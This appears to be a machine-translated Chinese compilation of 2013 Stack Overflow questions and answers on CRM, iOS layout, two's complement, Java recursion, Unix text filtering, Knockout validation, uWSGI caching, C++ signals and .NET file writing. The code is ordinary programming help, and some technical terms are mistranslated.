# dynamics-crm-2011 - 适用于 Outlook 的 Dynamics CRM 2011，关于未在电子邮件中显示的窗格

> ID：15443698
> 
> 赞同：1
> 
> 时间：2013-03-15T23:28:46.443
> 
> 标签：dynamics-crm-2011

已在运行 Outlook 2013 的 Win 7 计算机上安装了 Outlook for CRM 2011 加载项以及 Rollup 12。当用户打开电子邮件并单击“设置相关”时，她可以选择一个联系人，但电子邮件表单不会更改为在底部显示“关于窗格”。“跟踪”按钮确实更改为“取消跟踪”，所以它似乎正在工作，只是没有显示。

我已经多次卸载/重新安装，但无济于事。它确实适用于我办公室的其他机器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-18T14:47:32.723

您可以在 Outlook 中检查此人的 CRM 个人设置。如果您在“电子邮件”选项卡下，有一个“检查 Outlook 中的传入电子邮件并确定是否应链接电子邮件并将其保存为 CRM 记录的复选框。如果选中该框，则可能导致您描述的问题以上。

我遇到了完全相同的问题，并确保未选中该框每次都能解决。我已经在多个动态 crm 论坛中询问过，甚至是我们的 Microsoft 合作伙伴，但没有人能够解释原因，但是选中该框肯定会使 Outlook 电子邮件中的相关字段消失并且不显示。

# ios6 - 使 UILabel 以不断变化的内容和 AutoLayout 为中心

> ID：15443699
> 
> 赞同：2
> 
> 时间：2013-03-15T23:28:52.433
> 
> 标签：ios6, autolayout

我有 2 个视图。一个 MapKitView 和一个 UILabel。自动布局已打开。

我希望 MKView 占据整个屏幕（这似乎工作正常）并且 UILabel 保持与屏幕底部的自动距离但水平居中。UILabel 内容以编程方式更改，之后我调用`sizeToFit`.

在调用`sizeToFit`UILabel 之后，它不再居中 - 宽度似乎仅从右侧（后缘）调整，使左侧保持恒定位置。

我的理解是，我应该能够通过在 IB 中设置正确的约束来实现我想要的吗？

我对标签应用的约束是：

```
Height Equals: 32
Width Equals: 166
Bottom Space to: Superview Equals: Default
Align Center X to: Map View 
```

只有最后一个，“Align Center X”是一个用户约束——其余的由 IB 提供。

我已经尝试了很多事情，但没有一个有太多的理解（大概是我的问题！）。

我已经打电话`setTranslatesAutoresizingMaskIntoConstraints: NO`给标签了。我已经设置了标签的`autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight | UIViewAutoresizingFlexibleLeftMargin | UIViewAutoresizingFlexibleRightMargin`. 我尝试设置`preferredMaxLayoutWidth`为随机值。`needsUpdateConstraints`在标签上调用。我试着把电话`sizeToFit`放在`viewDidLayoutSubviews`.

我得出的结论是，我需要更多地了解我应该如何处理这个问题。`sizeToFit`启用自动布局时不是要调用的东西吗？调用后我是否需要以某种方式刺激自动布局`sizeToFit`？我注意到旋转模拟器似乎使标签居中，所以听起来有可能吗？

我已经重新阅读了[Apple Auto Layout 指南](http://developer.apple.com/library/ios/#documentation/UserExperience/Conceptual/AutolayoutPG/Articles/Introduction.html#//apple_ref/doc/uid/TP40010853-CH1-SW1)，但恐怕我仍然不确定我做错了什么，并且建议的调试技巧（visualizeConstraints 等）似乎在 iOS 上不起作用。

感谢您提供任何线索。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-16T22:19:43.913

我关于必须刺激的想法似乎是正确的。打电话后`sizeToFit`我需要打电话`[label.superview setNeedsLayout]`。虽然这可行，但我不确定为什么我需要手动执行此操作，而不是在尺寸更改时将布局标记为脏的标签。

# binary - 如何检查二进制补码减法方程的负解？

> ID：15443704
> 
> 赞同：0
> 
> 时间：2013-03-15T23:29:16.070
> 
> 标签：binary, subtraction, twos-complement

嘿伙计们，我仍在尝试掌握二进制补码算术的窍门，我可以得到正确的答案，因为我正在研究解决方案的练习问题。

当我得到二进制的答案时，在应用二进制补码并添加数字之前，我似乎无法将其等同于十进制答案。

000100-111001 十进制是 4 - 57= -53

变成

0001000+000111 是 4 + (-57)？

给出001011的解决方案

如何证明 001011 等于 -53？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:28:18.637

要回答您的问题，首先 001011 不等于 -53。这是错误的答案。我们知道它必须是正数，因为最高位是 0，而不是 1。001011 实际上等于 11（以十为底）。

现在让我们以 4 - 57 为例。这与 4 + (-57) 相同。转换为二进制（我将在此示例中仅使用一个字节）我们得到：4 是 0000 0100，57 是 0011 1001。要将 57 转换为负 57，请使用二进制补码：
1\. 取反：1100 0110
2\. 加一：1100 0111
所以现在我们得到以下等式：

```
 0000 0100
+ 1100 0111
------------
  1100 1011 
```

我们通过简单地添加行来获得答案。我们得到的答案是 1100 1011。我们知道它是否定的，因为最高位（这里是最左边的）是 1。要找到它的大小，我们应用二进制补码：
1\. 否定：0011 0100
2\. 加一： 0011 0101
这等于以十为基数的 53。

另一种查看它是否正确的方法是将其与数字的正数相加。

```
 1100 1011
+ 0011 0101
------------
 10000 0000 
```

由于二进制补码定义为从 2^n 中减去的数字，其中 n 是位数，因此总和会得到这个结果。剔除 1 的数字，有趣的是剩下的只是 0 - 任何数字加上它的负数都是零。

# java - 需要在java中显示流满二叉树

> ID：15443705
> 
> 赞同：2
> 
> 时间：2013-03-15T23:29:28.097
> 
> 标签：java, recursion, binary-search-tree

这个网站上基本上有同样的问题，除了它说不要在问题中发布问题这里是一个链接。 [二叉树递归函数](https://stackoverflow.com/questions/13295794/binary-tree-recursive-function)

我需要打印出一个看起来像这样但任意大小的二叉树：

```
--------x-------
----x-------x---
--x---x---x---x-
-x-x-x-x-x-x-x-x 
xxxxxxxxxxxxxxxx 
```

但是，当我执行代码时会输出错误以及无休止的打印

```
:::X:::::X::X:XXXXX 
```

在它下面有一条蓝线，我可以点击它，它会弹出一个窗口，上面写着“找不到源”，上面有无尽的 X

```
at sun.nio.cs.SingleByte.withResult(Unknown Source)
at sun.nio.cs.SingleByte.access$000(Unknown Source)
at sun.nio.cs.SingleByte$Encoder.encodeArrayLoop(Unknown Source)
at sun.nio.cs.SingleByte$Encoder.encodeLoop(Unknown Source)
at java.nio.charset.CharsetEncoder.encode(Unknown Source)
at sun.nio.cs.StreamEncoder.implWrite(Unknown Source)
at sun.nio.cs.StreamEncoder.write(Unknown Source)
at java.io.OutputStreamWriter.write(Unknown Source)
at java.io.BufferedWriter.flushBuffer(Unknown Source)
at java.io.PrintStream.write(Unknown Source)
at java.io.PrintStream.print(Unknown Source)
at BinaryBuilder.display(BinaryBuilder.java:25)
at BinaryBuilder.display(BinaryBuilder.java:31)
at BinaryBuilder.display(BinaryBuilder.java:31) 
```

到目前为止，我的代码无法正常工作，并且我在递归和理解堆栈帧执行顺序方面遇到了问题。请帮助我认为我在正确的轨道上使用该行从递归中返回。我需要一些指导并朝着正确的方向前进:)

```
 import java.util.Scanner;
public class BinaryBuilder {
    int levels = 0;
    int width = 0;
    int leaves = 0;
    Scanner sn = new Scanner(System.in);
    public BinaryBuilder() {
        //prt("how many leaves?");
        //leaves = sn.nextInt();
        //levels = (int)Math.sqrt((double)leaves);
    }
    public void setLevelLeaves(int l,int le){
        levels = l;
        leaves = le;
    }

    public void display(int left, int right, int row){
        int i =left;
        int mid = (left+right)/2;           //maybe a +1
        if(row>levels){
            return;
        }
        while(i <= right){
            if(i==mid){
                System.out.print("X");
            }else{
                System.out.print(":");
            }
            i++;
        }
        display(left, mid, row++);
        display(mid, right, row++);
    }

    public void prt(String n){
        System.out.println(n);
    }

} 
```

主要的

```
public class PartBTest {

    public PartBTest() {
    }

    public static void main(String[] args) {
        BinaryBuilder bb = new BinaryBuilder();
        //bb.prt("width will be reduced to a factor of 2");
        bb.setLevelLeaves(3, 8);
        bb.display( 0, bb.leaves-1, 0);
    }

} 
```

快乐编码：}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T01:04:00.220

哇！

很抱歉回复晚了，有点被一些游戏赶上了，但我终于把这个弄出来了。

```
import java.util.Scanner;

public class Testing {

    public static void main(final String[] args) {

        final Scanner in = new Scanner(System.in);

        System.out.print("How many rows would you like?");

        final int rows = in.nextInt();
        int mod = (1 << (rows - 1)) - 1;

        for(int i = 0; i < rows; i++){
            for(int j = 0; j < mod; j++){
                System.out.print("-");
            }
            System.out.print("X");
            for (int j = 0; j < (1 << i) - 1; j++){
                for(int k = 0; k < 2 * mod + 1; k++){
                    System.out.print("-");
                }
                System.out.print("X");
            }
            for(int j = 0; j < mod; j++){
                System.out.print("-");
            }
            mod >>= 1;
            System.out.println();
        }

        in.close();

    }

} 
```

这是一种非常直接的逻辑方法。它使用 2 次方和二进制的基本原理来计算需要做什么以及应该如何完成。如您所见，第一行将有`0b1`X，第二行将有`0b10`X，依此类推。从那里，您还可以看到 x 之前所需的破折号数量。如果有 4 行，第一行需要`0b111`破折号，第二行需要`0b11`. 从那里开始，它只是重复对破折号数量进行相反的衰减。第一个需要 0 次重复，第二个需要 1 次。

如果您需要对此进行更多解释，我很乐意这样做。

**编辑 1：更多解释**

对于以下解释，我将`rows = 4`用于分析。因此，输出应类似于：

```
-------X-------
---X-------X---
-X---X---X---X-
X-X-X-X-X-X-X-X 
```

让我们分解一行。以第二个为例，我们可以得出逻辑流程为：

1.  打印缓冲区（在本例中为 3 个破折号）->`---`
2.  打印出单独的 x ->`---x`
3.  打印出重复部分 n 次。`n = 1`, ( `-------x`) ->`---x-------x`
4.  打印出缓冲区（又是 3 个破折号）->`---x-------x---`

这可以在所有情况下复制。

第一种情况：缓冲区 = 7，n = 0 -> 由于 n=0 没有生成重复部分
第二种情况：缓冲区 = 3，n = 1，缓冲区中的破折号 = 7
第三种情况：缓冲区 = 1，n = 3，缓冲区中的破折号= 3
第四种情况：缓冲区 = 0，n = 7，缓冲区中的破折号 = 1

您可以看到在所有这些情况下，变量都与 2 减去 1 的幂（梅森素数）有关。

使用该技术，我们得出了一些基本公式的结论：

`(1 << (rows - 1)) - 1)`使用行数 (4) 将 的值`0001`移到`1000`，然后减去 1，`0111`剩下 7，即初始缓冲区。

`(1 << i) - 1`使用我们所在的当前行（范围 0-3）来产生重复的次数。将 0、1、2 和 3 插入到我们分别得到的公式中：0、1、3、7（次数中间部分每行重复）

`2 * mod - 1`用于计算上面公式中使用的“中间部分”中的破折号数量

`mod >>= 1`向右移动模组。这允许第一个公式从初始值 7 变为 3，变为 1，然后变为 0。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:56:59.337

尝试直接显示输出会使您的递归变得繁琐。此外，您可能需要重新考虑您的参数。我相信叶子数应该足够了。

我会做不同的事情，通过为每个调用返回一个字符串列表，而不是立即打印输出。这样，您可以通过使用 {leaf count}/2 运行它，将列表与自身合并（通过连接同一索引中的行），然后为根添加一个新的标题行来实现您的 main 方法。

* * *

以下是我的解决方案。请注意，它只接受 2 的幂的参数：

```
public static List<String> buildTree(int leafs) {
    if (leafs == 1)
        return Arrays.asList("x");

    // Recursive call
    List<String> subTree = buildTree(leafs/2);

    ArrayList<String> merged = new ArrayList<String>();
    // Add new header
    String blanks = String.format("%-" + (leafs/2) + "s", "").replace(' ', '-');
    String header = blanks + "x" + blanks.substring(1);
    merged.add(header);

    // Duplicate subtree
    for (String row : subTree)
        merged.add(row + row);

    return merged;
} 
```

# unix - 模式匹配并删除除最后一次出现的所有行

> ID：15443711
> 
> 赞同：1
> 
> 时间：2013-03-15T23:29:51.050
> 
> 标签：unix

我有一个包含 100 多行的 txt 文件，我想搜索模式并删除除最后一次出现之外的所有行。

以下是 txt 文件中的行。

我的模式搜索是 "string1=" 、 "string2=" 、 "string3=" 、 "string4=" 和 "string5="

```
string1=hi
string2=hello
string3=welcome
string3=welcome1
string3=
string4=hi
string5=hello 
```

我想遍历每一行并在文件中保持“string3=”为空并删除“string3=welcome”、“string3=welcome1”

请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:37:50.297

对于单个模式，您可以从以下内容开始：

```
grep "string3" input | tail -1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T00:08:12.090

```
#!/usr/bin/perl

my %h;

while (<STDIN>) {
  my ($k, $v) = split /=/;
  $h{$k} = $v;
  }

foreach my $k ( sort keys %h ) {
  print "$k=$h{$k}";
  } 
```

此处的 perl 脚本会将您的列表作为标准输入并处理您提到的输出。这假设您希望键 (string*) 作为排序输出。

如果您只想要以 string1-5 开头的值，那么您可以在 while 循环的开头放置一个匹配项，如下所示：

```
next if ! /^string[1-5]=/; 
```

# asp.net-mvc - 带有淘汰赛的 ASP.NET MVC 剃须刀表单将无法验证

> ID：15443725
> 
> 赞同：1
> 
> 时间：2013-03-15T23:31:26.950
> 
> 标签：asp.net-mvc, razor, knockout.js, validation

我有这样的模型（简化）

```
public class User
{
  [Required]
  public string UserName { get; set; }

  // Other fields
} 
```

一个带有淘汰赛的 MVC 剃刀视图，`viewModel`如下所示：

```
@using (Html.BeginForm("MyAction", FormMethod.Post, new { id = "profileEditorForm" }))
{
  @Html.ValidationSummary(false)

  @Html.LabelFor(n => n.UserName)
  @Html.TextBoxFor(n => n.UserName, new { data_bind = "value: UserName" })
  @Html.ValidationMessageFor(n => n.UserName)

  @* Other fields *@    

  <p>
    <input type="submit" value="Save" alt="" title="" />
    <a href="/">Cancel</a>
  </p>
}

<script type="text/javascript">

  $(function() {
    var vm = new viewModel(@(Html.Raw(Json.Encode(@Model))));
    ko.applyBindings(vm);

    $("#profileEditorForm").validate({
      submitHandler: function(form) {
        alert('Validating ' + ko.toJSON(vm));
        if (vm.save)
          window.location.href = "/";
        return false;
      }
    });
  });

  var viewModel = function(model) {
    var self = this;
    self.UserName = ko.observable(model.UserName);
    // Other fields

    self.save = function() {
      alert('Saving ' + ko.toJSON(self));
    }
  };
};
</script> 
```

我无法让它给我客户端验证，即使它通过验证功能（警报插入表明）然后直接进入保存并将无效的内容发回 MVC 操作。

你能帮我如何在这个表单上启用客户端验证（它在 web.confir 中启用）。是淘汰赛破坏了这一天（尽管所有绑定都工作得很好？还是我正在看但没有看到的东西？

帮助高度赞赏！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-16T08:41:45.497

验证不适用于淘汰赛绑定....

您必须在客户端复制验证。更快的方法是使用敲除验证插件，但是当你有很多数据时它会很慢。

[https://github.com/ericmbarnard/Knockout-Validation](https://github.com/ericmbarnard/Knockout-Validation)

或者您可以只使用 jquery 验证。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-21T05:11:24.110

模型验证在淘汰赛绑定中不起作用，您必须下载[knockoutValidation.js](https://github.com/ericmbarnard/Knockout-Validation)文件并使用淘汰赛验证

例子 ：

在 KnockoutJS 中验证用户名

```
var self = this;

self.UserName = ko.observable(UserName).extend({
    required: {
        message:"Please enter User Name"
    }
}); 
```

# ios - ZXingObjC生成的PDF417有时不可读

> ID：15443726
> 
> 赞同：2
> 
> 时间：2013-03-15T23:31:32.353
> 
> 标签：ios, zxing

我正在尝试使用 ZXingObjC 为我的 iOS 应用程序生成 PDF417 条形码。我已经完成了所有工作，有点。它生成条形码并将其显示在屏幕上。不幸的是，有时“真正的”扫描仪无法读取条形码。

如果编码文本都是大写或小写字符，例如“现在是所有好人的时间”，那么生成的条形码是完全可读的。

但是，如果字符串在字符串中的任何位置只包含一个数字，则条形码是不可读的。“真正的”扫描仪无法识别它。

其他编码字符串会产生解码为乱码的条形码。

我想知道是否需要进行更多配置才能正确生成 PDF417。例如，它在 ZXingObjC 网站上说“对所有 PDF417 字符使用 UTF-16”。你会怎么做？

我应该设置其他配置选项吗？

我知道这是一个晦涩的话题，但希望有人对此有所了解。提前致谢。

# jquery - 单击其他视频时清除 youtube 嵌入视频“src”

> ID：15443729
> 
> 赞同：1
> 
> 时间：2013-03-15T23:31:49.047
> 
> 标签：jquery, youtube

我在页面上有 3 个 youtube 视频。页面加载带有**src** “ [http://img.youtube.com/vi/video_id/maxresdefault.jpg](http://img.youtube.com/vi/) **”的****img**元素。然后，对于每个缩略图，都使用 youtube 的**iframe**视频代码。

 ******即使我明确地将**display: none**指向**iframe**元素，如果我设置**autoplay=1** ，它仍然会加载视频，并且它开始播放不可见。我认为它不会加载，虽然它是不可见的，所以我可以通过 css 调用显示和隐藏视频，而无需 javascript。

那么，当单击另一个缩略图并显示其他视频时，我如何指向 jQuery 清除“ **iframe src= ”？**

这个想法是只提供视频缩略图 jpg，并且只在显式点击缩略图时播放视频 - 如果其他视频已经在播放，那么应该停止清除它的**src**。所有视频都可以有不同的 * *ID* *s'。

PS我希望你能理解我的英语:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-05-11T05:21:56.217

如果您有兴趣使用 AngularJs，那么它非常易于使用，

```
<iframe class="img-responsive" src="{{pdfLoc| trustThisUrl }}" ng-style="{
                height: iframeHeight * 0.75 + 'px'
            }" style="width:100%"></iframe> 
```

这里 trustThisUrl 只是过滤器，

```
angular.module("deck").filter('trustThisUrl', ["$sce", function ($sce) {
        return function (val) {
            return $sce.trustAsResourceUrl(val);
        };
    }]); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-15T23:38:41.483

使用 jQuery 的`.attr()`方法。所以你会说`$('iframe').attr('src', '');`基本上删除它。

编辑：我还应该补充一点，您可以以相同的方式添加新 URL，`$('iframe').attr('src', 'http://www.youtube.com/new-url-goes-here');`只需确保将 iframe 更改为您设置的任何 iframe 或 ID******

# python - 用于 nginx/uwsgi 服务器的持久内存中 Python 对象

> ID：15443732
> 
> 赞同：8
> 
> 时间：2013-03-15T23:31:54.653
> 
> 标签：python, optimization, nginx, redis, uwsgi

我怀疑这甚至是可能的，但这是问题和建议的解决方案（建议解决方案的可行性是这个问题的对象）：

我有一些“全局数据”需要可用于所有请求。我将这些数据保存到 Riak 并使用 Redis 作为缓存层以提高访问速度（目前......）。数据被分成大约 30 个逻辑块，每个大约 8 KB。

每个请求都需要读取这些 8KB 块中的 4 个，从而从 Redis 或 Riak 读取 32KB 的数据。这是对任何需要读取的特定于请求的数据的补充（这是相当多的）。

假设每秒甚至 3000 个请求（这不是实时服务器，所以我没有实数，但 3000ps 是一个合理的假设，可能会更多），这意味着从 Redis 或 Riak 传输 96KBps 到已经不是- 从应用程序逻辑进行的其他无关紧要的调用。**此外，Python每秒** 解析 3000 次这些 8KB 对象的 JSON 。

所有这些——尤其是 Python 必须反复反序列化数据——似乎完全是一种浪费，一个完美优雅的解决方案是将**反序列化的数据缓存在 Python 的内存本机对象中**，我可以定期刷新它和当所有这些“静态”数据变得陈旧时。几分钟（或几小时）一次，而不是每秒 3000 次。

但我不知道这是否可能。您实际上需要一个“始终运行”的应用程序来缓存其内存中的任何数据。而且我知道在 nginx+uwsgi+python 组合中情况并非如此（相对于节点之类的东西）-据我所知， **python 内存数据不会在所有请求中持久保存**，除非我大错特错。

不幸的是，这是一个我“继承”的系统，因此无法在基础技术方面进行太多更改，我也不了解 nginx+uwsgi+python 组合在启动 Python 进程和持久化方面的工作原理Python 内存数据——这意味着我可能对上面的假设大错特错！

因此，**关于该解决方案是否可行的直接建议**+ 对可以帮助我了解 nginx+uwsgi+python 在启动新进程和内存分配方面如何工作的材料的参考将大有帮助。

PS：

1.  已经阅读了 nginx、uwsgi 等的一些文档，但还没有完全理解我的用例的后果。希望现在能在这方面取得一些进展

2.  如果内存中的事情可以解决，我会放弃 Redis，因为我只缓存我上面提到的静态数据。这使得进程内持久的内存中 Python 缓存对我来说更具吸引力，减少了系统中的一个移动部分，并且每个请求至少有四个网络往返。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:57:14.597

你的建议不是直接可行的。由于新进程可以在您的控制之外上下旋转，因此无法将原生 Python 数据保存在内存中。

但是，有几种方法可以解决这个问题。

通常，您只需要一级键值存储即可。有时，为值提供固定大小的缓冲区（您可以直接将其用作`str`//对象；您需要在其中进行任何其他操作`bytes`或以其他方式进行序列化）就是您所需要的。在这种情况下，uWSGI 的内置[缓存框架](http://uwsgi-docs.readthedocs.org/en/latest/Caching.html)将处理您需要的一切。`bytearray``struct`

如果您需要更精确的控制，您可以查看缓存是如何实现的，[`SharedArea`](http://uwsgi-docs.readthedocs.org/en/latest/SharedArea.html)并进行一些自定义。但是，我不建议这样做。它基本上为您提供了与文件相同的 API，与仅使用文件相比，唯一真正的优势是服务器将管理文件的生命周期；它适用于所有支持 uWSGI 的语言，即使是那些不允许文件的语言；如果您以后需要，它可以更轻松地将您的自定义缓存迁移到分布式（多计算机）缓存。我认为这些都与你无关。

另一种获得平面键值存储但没有固定大小缓冲区的方法是使用 Python 的 stdlib [`anydbm`](http://docs.python.org/2/library/anydbm.html)。键值查找与 Python 一样：它看起来`dict`像哈希表。

如果你需要处理一些其他简单的类型——任何可以非常快地 un/pickle 的类型，比如 s——`int`你可能需要考虑[`shelve`](http://docs.python.org/2/library/shelve.html).

如果您的结构足够严格，您可以将键值数据库用于顶层，但通过 a 访问值`ctypes.Structure`，或使用 反序列化/序列化`struct`。但通常，如果你能做到这一点，你也可以消除顶级，此时你的整个事情只是一个大`Structure`或`Array`。

此时，您可以只使用普通文件进行存储——要么`mmap`它（for `ctypes`），要么只是`open`和`read`它（for `struct`）。

或者使用`multiprocessing`'s [Shared `ctypes`Objects](http://docs.python.org/2/library/multiprocessing.html#shared-ctypes-objects)直接访问你`Structure`的共享内存区域。

同时，如果您实际上并不总是需要所有的缓存数据，只是偶尔需要一些零碎的数据，这正是数据库的用途。同样，`anydbm`等可能是您所需要的，但如果您有复杂的结构，请绘制一个 ER 图，将其转换为一组表，然后使用 MySQL 之类的东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-07-28T23:13:27.467

“据我所知，python 内存数据不会保留在所有请求中，除非我大错特错。”

你误会了。

在 CGI 机制上使用 uwsgi 的全部意义在于跨线程保存数据并节省每次调用的初始化开销。您*必须*`processes = 1`在文件中进行设置`.ini`，或者根据 uwsgi 的配置方式，它可能会代表您启动 1 个以上的工作进程。记录`env`and 查找`'wsgi.multiprocess': False`and `'wsgi.multithread': True`，并且单个 worker 的所有`uwsgi.core`线程都应该显示相同的数据。

您还可以使用内置的`stats-server`.

这就是为什么 uwsgi 提供了多线程操作数据存储`lock`的`unlock`功能。

您可以通过在您的应用程序中添加一个路由来轻松测试这一点，该`/status`路由仅转储您的全局数据对象的 json 表示，并在更新商店的操作后每隔一段时间查看它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-07-29T00:36:19.070

你没有说要写回这些数据，它是静态的吗？在这种情况下，解决方案非常简单，我不知道所有“它不可行”的响应是怎么回事。

Uwsgi 工作者**是**始终运行的应用程序。所以数据绝对会在请求之间持久化。您需要做的就是将内容存储在全局变量中，就是这样。请记住，它是每个工人的，工人确实会不时重启，因此您需要适当的加载/失效策略。

如果数据很少更新（很少会在更新时重新启动服务器），您可以节省更多。只需在应用程序构建期间创建对象。这样，它们将被创建一次，然后所有的工作人员将分叉出主服务器，并重用相同的数据。当然，它是写时复制，所以如果你更新它，你将失去内存优势（如果 python 决定在 gc 运行期间压缩它的内存，也会发生同样的事情，所以它不是超级可预测的）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T23:40:58.890

我自己从来没有真正尝试过，但你可以使用 uWSGI 的[SharedArea](http://uwsgi-docs.readthedocs.org/en/latest/SharedArea.html)来完成你所追求的吗？

# c++ - 什么是不可捕获的异常

> ID：15443737
> 
> 赞同：3
> 
> 时间：2013-03-15T23:32:16.300
> 
> 标签：c++, exception, try-catch

海合会 (GCC) 4.5.3

GNU gdb (GDB) 7.5.50.20130309-cvs (cygwin-special)

网豆 7.3

在我的代码中捕获 SIGSEGV（Segment Fault Exception）时遇到了一些麻烦。try-catch 不会捕获它（下面的代码）。这是一个不可捕获的异常吗？有什么办法可以抓到吗？（当然）我做错了什么？

艺术

```
string SlipStringOp::dump(const SlipCell& X) const {
   stringstream pretty;
   PTR ptr = *getPtr(X);

   pretty << "[string   ] " << dumpLink(X)  << " = " 
           << setfill('0') << setw(8) << hex << ptr
           << " -> ";
   try {
      pretty << ptr->dump();
   } catch(exception& e) {
      pretty << e.what();
      postError(SlipErr::E3023, "SlipStringOp::dump", "", "Deletion of cell deleted the pointer.");
   } catch(...) {
      postError(SlipErr::E3023, "SlipStringOp::dump", "", "Deletion of cell deleted the pointer.");   
   }
   return pretty.str();
}; // string SlipStringOp::dump(const SlipCell& X) const 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-15T23:42:01.123

SIGSEGV 也不例外；这是一个信号。访问无效的内存地址称为分段错误。当您的程序执行此操作时，操作系统将向您的进程发送 SIGSEGV 信号。此信号的默认处理程序将立即终止该进程。

您[*可以*拦截一个信号](http://en.wikipedia.org/wiki/Sigaction_%28Unix%29)，但这不是您应该自己处理的信号。如果你的程序导致了分段错误，那么它就有一个错误，这是毫无疑问的。

如果您已将分段错误与`pretty << ptr->dump();`线路隔离，我猜想问题可能`ptr`是没有指向有效对象。或者，该`dump`功能正在做坏事。

**不要**试图通过处理信号来解决这个问题。**通过确保您**的程序不会导致分段错误来解决此问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:45:38.323

这里有两个问题。首先，您为什么要获得 SIGSEGV？这里可能没有足够的代码让我们知道，但是您对 ptr->dump() 的调用是否递归地调用了相同的函数？如果是这样，则您有无限递归，这会导致段错误。

第二个问题是你如何捕获信号，之前的响应者已经回答了这个问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-16T00:22:52.000

`throw`您使用表达式引发异常。`catch`您在子句中捕获异常。

你通过调用 来发出信号`raise`。您可以通过在引发异常之前安装处理程序来处理信号。

任何其他动作和交互都是系统特定的（即不可移植）。

# c# - 在 .NET 1.1 中将 StringBuilder 的内容写入文本文件的最简单方法是什么？

> ID：15443739
> 
> 赞同：64
> 
> 时间：2013-03-15T23:32:31.257
> 
> 标签：c#, .net, file-io, windows-ce, stringbuilder

我必须使用 StringBuilder 而不是字符串列表，因为这个项目被 .NET 1.1 卡住了。

我想编写一系列已写入文件的调试消息，以便在闲暇时学习，因为屏幕上看不到太多内容（MessageBox 没有滚动条）。.NET 1.1 中似乎没有一些编写文件的简单方法。我也无法`Environment.Newline`干净地分隔我附加的行（`AppendLine`在这个古老的 StringBuilder 版本中也不可用）。

.NET 1.1 (C#) 中将 StringBuilder 的内容写入文件的最简单方法是什么？手持设备上没有“C”驱动器，所以我想我必须将它写入“\hereIAm.txt”或其他东西。

* * *

## 回答 #1

> 赞同：98
> 
> 时间：2014-06-27T11:12:02.373

我知道这是一篇旧帖子，它想要 .NET 1.1 的答案，但已经有一个很好的答案。我认为最好为那些登陆这篇文章的人提供一个答案，这些人可能拥有更新版本的 .Net 框架，比如我自己在寻找相同问题的答案时。

在这些情况下，有一种更简单的方法可以将 StringBuilder 的内容写入文本文件。只需一行代码即可完成。它可能不是最有效的，但这不是现在真正的问题。

```
System.IO.File.WriteAllText(@"C:\MyDir\MyNewTextFile.txt",sbMyStringBuilder.ToString()); 
```

* * *

## 回答 #2

> 赞同：96
> 
> 时间：2013-03-15T23:35:17.760

您仍然可以访问`StreamWriter`：

```
using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"\hereIam.txt"))
{
    file.WriteLine(sb.ToString()); // "sb" is the StringBuilder
} 
```

来自 MSDN 文档：*[写入文本文件 (Visual C#)](http://msdn.microsoft.com/en-us/library/aa287548(v=vs.71).aspx)*。

[`File.WriteAllText`](https://docs.microsoft.com/en-us/dotnet/api/system.io.file.writealltext?view=netframework-4.8)对于较新版本的 .NET Framework（2.0 版以上），这可以通过使用该方法的一行来实现。

```
System.IO.File.WriteAllText(@"C:\TextFile.txt", stringBuilder.ToString()); 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2013-03-15T23:36:19.070

不需要`StringBuilder`：

```
string path = @"c:\hereIAm.txt";
if (!File.Exists(path)) 
{
    // Create a file to write to.
    using (StreamWriter sw = File.CreateText(path)) 
    {
        sw.WriteLine("Here");
        sw.WriteLine("I");
        sw.WriteLine("am.");
    }    
} 
```

但当然，您可以使用`StringBuilder`创建所有行并将它们一次写入文件。

```
sw.Write(stringBuilder.ToString()); 
```

[`StreamWriter.Write`方法（字符串）](http://msdn.microsoft.com/en-us/library/aa328976%28v=vs.71%29.aspx)（.NET Framework 1.1）

[**将文本写入文件 (.NET Framework 1.1)**](http://msdn.microsoft.com/en-us/library/6ka1wd3w%28v=vs.71%29.aspx)

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2013-03-15T23:38:06.770

[StreamWriter](http://msdn.microsoft.com/en-us/library/system.io.streamwriter%28v=vs.71%29.aspx)可用于 NET 1.1。和[紧凑的框架](https://en.wikipedia.org/wiki/.NET_Compact_Framework)。只需打开文件并将 ToString 应用于您的 StringBuilder：

```
 StringBuilder sb = new StringBuilder();
    sb.Append(......);

    StreamWriter sw = new StreamWriter("\\hereIAm.txt", true);
    sw.Write(sb.ToString());
    sw.Close(); 
```

另外，请注意您说您想将调试消息附加到文件（如日志）。在这种情况下，StreamWriter 的正确构造函数是接受`append`布尔标志的构造函数。如果为真，那么它会尝试附加到现有文件，如果不存在则创建一个新文件。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2019-01-06T08:55:26.967

如果您需要从字符串生成器逐行编写

```
StringBuilder sb = new StringBuilder();
sb.AppendLine("New Line!");

using (var sw = new StreamWriter(@"C:\MyDir\MyNewTextFile.txt", true))
{
   sw.Write(sb.ToString());
} 
```

如果您需要从字符串生成器将所有文本写为单行

```
StringBuilder sb = new StringBuilder();
sb.Append("New Text line!");

using (var sw = new StreamWriter(@"C:\MyDir\MyNewTextFile.txt", true))
{
   sw.Write(sb.ToString());
} 
```

# apache - Apache - 虚拟主机和全局 apache 配置

> ID：15443742
> 
> 赞同：0
> 
> 时间：2013-03-15T23:33:01.520
> 
> 标签：apache, virtual-hosts

